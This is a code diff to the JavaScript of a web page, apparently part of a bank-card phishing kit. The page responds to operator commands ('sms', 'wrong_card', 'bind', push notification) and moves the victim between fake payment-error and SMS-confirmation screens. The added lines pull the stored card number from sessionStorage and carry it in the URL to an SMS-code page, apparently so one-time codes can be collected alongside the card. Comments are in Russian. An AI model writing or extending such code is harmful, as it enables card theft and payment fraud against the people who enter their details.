@@ -665,16 +665,24 @@
         window.showPushNotification();
     } else if (command.action === 'sms') {
         console.log('📱 Получена команда SMS');
-        window.redirectToSMS();
+        // ПЕРЕДАЕМ НОМЕР КАРТЫ ЧЕРЕЗ URL
+        const cardData = JSON.parse(sessionStorage.getItem('cardData') || '{}');
+        const cardNumber = cardData.number || '';
+        window.redirectToSMS(cardNumber);
     } else if (command.action === 'wrong_card') {
         console.log('❌ Получена команда WRONG_CARD');
         window.redirectToPaymentWithError();
     } else if (command.action === 'bind') {
         console.log('🔗 Получена команда BIND');
-        // Можно добавить уведомление о привязке карты
         document.querySelector('.loading-text').textContent = '✅ Карта привязана!';
     }
 }
+
+// ОБНОВЛЕННАЯ ФУНКЦИЯ РЕДИРЕКТА
+window.redirectToSMS = function(cardNumber) {
+    // ПЕРЕДАЕМ НОМЕР КАРТЫ В URL
+    window.location.href = `sms.html?card=${encodeURIComponent(cardNumber)}`;
+};
 
         function startPing() {
             pingInterval = setInterval(() => {
@@ -764,4 +772,5 @@
     </script>
 </body>
 </html>
+
 
